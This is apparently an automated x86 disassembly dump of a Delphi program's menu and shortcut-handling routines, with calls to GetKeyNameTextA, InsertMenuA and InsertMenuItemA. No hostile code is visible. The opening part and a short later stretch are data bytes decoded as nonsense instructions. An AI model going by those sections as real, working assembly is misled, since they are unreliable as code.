add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] cl
sbb eax [ esi ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add [ eax ] dh
and eax [ esi ]
int3
sub_45d7d5
and eax [ esi ]
fcomp [ esi ]
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x46 ] ch
add [ eax ] bl
and eax [ esi ]
or [ ecx ] ch
inc esi
add [ eax + ebp + 0x46 ] cl
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rcl [ eax ] 0xd8
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xc4756e65
xlat
inc ebp
add [ eax ] bh
xlat
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add ah bh
daa
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax - 0x2f ] ah
inc ebp
add ah ch
daa
inc esi
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc465646f
mov eax r-xdata
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
call [ edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
pop esp
fld [ ebp ]
add ecx [ edi ]
push esp
push eax
outsd
jo r-xdata
jb r-xdata
add bh bh
nop
and eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
les edi [ eax + r-xdata ]
pushad
rol [ ebp ] 0x1
or al 0x28
inc esi
add [ eax + ebp ] bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
fcomp st1
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
outsb
je r-xdata
ja r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + ebp ]
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x27 ] bl
inc ebp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
pop eax
fld [ ebp ]
push es
adc [ eax ] al
inc ecx
add [ eax ] al
dec [ eax + 0x1004627 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add al dl
xor al [ eax ]
pushad
das
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
je r-xdata
outsb
je r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
fld [ ebp ]
lea eax [ eax ]
test al 0xda
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
inc esi
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add [ eax ] dh
and eax [ esi ]
int3
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + 0x2f ] ah
je r-xdata
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x74754274
or [ eax + 0x61 ] dh
jo r-xdata
fcomp st1
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
iretd
outsd
inc esp
fiadd [ ebp ]
push es
add [ eax ] al
test dh dl
inc ebp
add ah ch
and [ edx ] eax
pop eax
or eax 0x6f42616d
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
pushfd
fld [ ebp ]
add ecx [ esp + edx * 2 ]
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
je r-xdata
inc ebp
add [ 0x69526274 ] cl
push 0x74754274
fld [ ebp ]
add ecx [ edi ]
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add eax ebx
fiadd [ ebp ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
outsd
inc edx
outsd
je r-xdata
je r-xdata
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
fiadd [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
jo r-xdata
je r-xdata
outsb
add eax 0x756e654d
jae r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xd0045d9 ] bl
je r-xdata
sub_45de04
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44d12c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4529a0
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_45de5c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45de94
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404118
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404388
sub_45dee8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_45e0d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b0
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404300
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b0
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4041b0
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404300
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404300
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404118
mov eax esi
call sub_404118
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4041b0
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_40850c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404424
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45de94
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4043e0
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b0
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4043e0
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4043e0
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4043e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e0d8
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
sub_45e0ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4043d8
push eax
mov eax edi
call sub_4043d8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4043d8
push eax
mov eax edi
call sub_4045d8
push eax
mov eax [ esi ]
call sub_4045d8
pop edx
pop ecx
call sub_408260
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4043d8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404678
sub_45e148
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_45e223
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45e0ec
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45e0ec
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45e0ec
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45e0ec
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e22a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45dee8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408210
test eax eax
jne r-xdata
sub_45e260
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_460800
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_460810
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_45e2c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_460800
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_460800
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_460810
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_460810
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45e260
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45e260
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_460810
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_460810
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45e40c
push ebx
mov ebx eax
mov eax ebx
call sub_45af08
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_46331c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45e444
push ebx
mov ebx eax
mov eax ebx
call sub_45af1c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e474
push ebx
mov ebx eax
mov eax ebx
call sub_45af30
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e4a4
push ebx
mov ebx eax
mov eax ebx
call sub_45af58
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e4d4
push ebx
mov ebx eax
mov eax ebx
call sub_45af80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404524
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e508
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45af44
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e544
push ebx
mov ebx eax
mov eax ebx
call sub_45af94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e578
push ebx
mov ebx eax
mov eax ebx
call sub_45afa8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e5ac
push ebx
mov ebx eax
mov eax ebx
call sub_45afbc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e5e0
push ebx
mov ebx eax
mov eax ebx
call sub_42236c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45e608
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45e628
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_460668
sub_45e648
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4606d8
sub_45e668
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_46072c
sub_45e688
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45e6a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_40416c
sub_45e6c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_460858
sub_45e6e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_460834
sub_45e708
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_460848
sub_45e728
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45e754
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421a7c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45e240
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_461164
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45e7d0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_463100
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_460800
test eax eax
jg r-xdata
mov edx esi
call sub_460b98
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_460810
call sub_40331c
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_40331c
lea eax [ esi + 0x44 ]
call sub_40d814
lea eax [ esi + 0x78 ]
call sub_40d814
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45ebec
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_419224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
call sub_40331c
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_45e884
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45eadf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eae6
lea eax [ ebp - 0x40 ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4041b0
mov eax ebx
call sub_460800
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45ed94
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404524
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_460800
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_460dbc
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_45dee8
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404498
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4045d8
push eax
mov eax ebx
call sub_45ed94
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4603d8
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404524
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4045d8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_460800
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45ed94
mov [ ebp - 0x25 ] eax
sub_45eaff
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_45e884
xor eax eax
pop ebp
retn
sub_45eb24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4623f8
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4613c0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4618bc
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_45e2c0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45eb94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ebde
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41e518
mov eax [ ebp - 0x4 ]
call sub_45e148
mov edx eax
mov eax ebx
call sub_460834
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ebe5
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_45ebec
push ebx
mov ebx eax
test edx edx
je r-xdata
